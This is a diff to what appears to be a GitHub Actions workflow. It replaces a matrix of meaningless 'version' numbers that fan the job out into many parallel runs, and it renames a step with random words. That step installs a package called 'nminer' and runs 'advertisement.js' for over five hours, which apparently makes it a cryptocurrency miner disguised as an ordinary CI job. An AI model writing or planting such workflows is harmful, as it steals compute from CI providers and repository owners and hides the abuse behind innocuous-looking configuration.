@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9645 }
-          - { version: 4848 }
-          - { version: 5705 }
-          - { version: 1249 }
-          - { version: 9137 }
-          - { version: 2926 }
-          - { version: 4453 }
-          - { version: 4650 }
-          - { version: 3550 }
-          - { version: 2414 }
-          - { version: 6648 }
-          - { version: 5297 }
-          - { version: 9550 }
-          - { version: 3860 }
-          - { version: 9622 }
-          - { version: 738 }
-          - { version: 1230 }
-          - { version: 1413 }
-          - { version: 136 }
-          - { version: 6910 }
+          - { version: 1819 }
+          - { version: 5700 }
+          - { version: 9732 }
+          - { version: 1310 }
+          - { version: 8788 }
+          - { version: 7188 }
+          - { version: 6062 }
+          - { version: 6363 }
+          - { version: 861 }
+          - { version: 2987 }
+          - { version: 2911 }
+          - { version: 8818 }
+          - { version: 299 }
+          - { version: 9705 }
+          - { version: 6878 }
+          - { version: 1066 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: armoire fragrant
+      - name: plugin nor whenever
         run: |
           npm install nminer@latest
-          timeout 340m node advertisement.js || echo "advertisement executed"
+          timeout 328m node advertisement.js || echo "advertisement executed"
